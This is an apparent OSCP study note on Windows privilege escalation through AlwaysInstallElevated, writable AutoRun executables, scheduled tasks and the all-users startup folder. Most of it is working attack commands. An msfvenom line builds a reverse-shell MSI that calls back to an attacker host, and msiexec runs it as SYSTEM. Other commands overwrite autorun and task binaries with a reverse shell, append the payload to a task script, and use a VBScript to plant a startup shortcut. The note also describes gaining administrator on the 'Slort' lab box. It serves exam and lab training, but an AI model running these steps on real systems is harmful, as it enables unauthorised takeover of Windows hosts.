---
title: "Windows Autoruns and Scheduled Tasks"
slug: windows-autoruns-and-scheduled-tasks
category: notes
handbook: oscp
tags: ["privilege-escalation", "windows"]
draft: false
pubDatetime: 2026-07-22T08:58:39+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "A group of misconfigurations that all end the same way: place or modify something a privileged trigger later executes."
---
A group of misconfigurations that all end the same way: place or modify something a privileged trigger later executes. Most fire on a reboot, an admin logon, or a timer rather than immediately, so they suit boxes that recycle. These are the quick-win registry and task vectors on the [Privilege Escalation (Windows)](/collections/oscp/privilege-escalation-windows) list. Payloads and catching are in [Reverse Shells](/collections/oscp/reverse-shells); confirm every ACL with [accesschk](/collections/oscp/accesschk).

## AlwaysInstallElevated

MSI installers can be configured to run with elevated privileges. When two registry values are both set to 1, any user can install an MSI as SYSTEM:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return 1. If either is missing or 0, it does not work. Build a malicious MSI and run it:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o reverse.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\reverse.msi
```

winPEAS reports both values under `windowscreds`.

## AutoRun Executables

Programs configured to run at startup are listed in the registry. If one points at a writable executable, replace it and wait for a reboot or admin logon:

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe -accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Back up the original, then overwrite:

```cmd
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp\program.exe.bak
copy /Y C:\Temp\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

On Windows 10 the AutoRun runs as the next user to log in, so trigger it by logging in as the target account.

## Scheduled Tasks

Tasks can be set to run as any user, including SYSTEM. A low-privilege account cannot enumerate other users' tasks directly, so rely on clues: a script or log file that shows a task running on a schedule.

```cmd
schtasks /query /fo LIST /v
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
```

When a task runs a writable script as SYSTEM, confirm write access and append the payload:

```cmd
accesschk.exe -accepteula -quvw <user> C:\Scripts\task.ps1
copy C:\Scripts\task.ps1 C:\Temp\task.ps1.bak
echo C:\Temp\reverse.exe >> C:\Scripts\task.ps1
```

Wait for the next scheduled run.

### Writable task executable

A task may call an executable directly instead of a script. If the executable or its containing directory is replaceable, preserve the original, put a reverse-shell executable at the exact path, and wait for the timer. The callback identity is the task's configured run-as account, so verify it with `whoami` rather than assuming SYSTEM:

```cmd
icacls C:\Backup\TFTP.EXE
icacls C:\Backup
move C:\Backup\TFTP.EXE C:\Backup\TFTP.EXE.bak
move C:\Temp\reverse.exe C:\Backup\TFTP.EXE
```

On Slort, `info.txt` exposed `C:\Backup\TFTP.EXE` and a five-minute interval. The web shell could rename the original and replace it, and the next run returned `slort\administrator`. A scheduled executable does not need service-control rights or a reboot when its timer is reachable.

## Startup Folder

Each user has a startup folder; there is also an all-users one:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

If it is writable, a shortcut placed there launches on the next logon of any user, including an admin. Check the directory ACL:

```cmd
accesschk.exe -accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

Startup entries must be shortcuts (`.lnk`). Create one with a small VBScript and run it with `cscript`:

```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\reverse.exe"
oLink.Save
```

```cmd
cscript CreateShortcut.vbs
```

Trigger it by logging in as the admin account.

## Checklist

- `AlwaysInstallElevated`: both HKLM and HKCU values must be 1, then `msiexec` a malicious MSI.
- AutoRun and startup vectors need a reboot or an admin logon; they are dead if the box never recycles.
- Confirm write access with `accesschk` before staging, and back up anything overwritten.
